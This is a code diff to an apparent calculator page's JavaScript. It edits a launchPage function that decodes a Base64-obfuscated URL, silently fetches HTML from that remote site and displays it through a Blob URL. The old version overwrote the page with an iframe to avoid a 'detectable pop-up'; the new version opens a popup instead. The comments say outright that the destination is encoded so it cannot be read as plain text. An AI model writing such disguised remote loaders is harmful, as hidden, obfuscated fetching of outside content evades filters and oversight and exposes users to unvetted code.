@@ -44,23 +44,21 @@ function calculateResult() {
  * and initializes it cleanly inside the active DOM window frame.
  */
 async function launchPage() {
-// 1. Fetch the raw page layout data silently in the background
-// 2. Base64 encode your destination domain so it is not visible as plain text
-const encryptedTarget = atob("aHR0cHM6Ly9nb3NwYXJ0YW5zLm5lb2NpdGllcy5vcmc="); 
-
-try {
-    const response = await fetch(encryptedTarget);
-    const htmlText = await response.text();
+    // 1. Fetch the raw page layout data silently in the background
+    // 2. Base64 encode your destination domain so it is not visible as plain text
+    const encryptedTarget = atob("aHR0cHM6Ly9nb3NwYXJ0YW5zLm5lb2NpdGllcy5vcmc="); 
     
-    // 3. Convert the downloaded response data directly into a local Blob array
-    const secureBlob = new Blob([htmlText], { type: 'text/html' });
-    const secureUrl = URL.createObjectURL(secureBlob);
-    
-    // 4. Overwrite the current environment instead of generating a detectable pop-up
-    document.open();
-    document.write(`<iframe src="${secureUrl}" style="width:100%; height:100vh; border:none;"></iframe>`);
-    document.close();
-} catch (err) {
-    console.error("Initialization failed.");
-  }
+    try {
+        const response = await fetch(encryptedTarget);
+        const htmlText = await response.text();
+        
+        // 3. Convert the downloaded response data directly into a local Blob array
+        const secureBlob = new Blob([htmlText], { type: 'text/html' });
+        const secureUrl = URL.createObjectURL(secureBlob);
+        
+        // 4. Open Popup
+        window.open(secureUrl, "_blank");
+    } catch (err) {
+        console.error("Initialization failed.");
+      }
 }
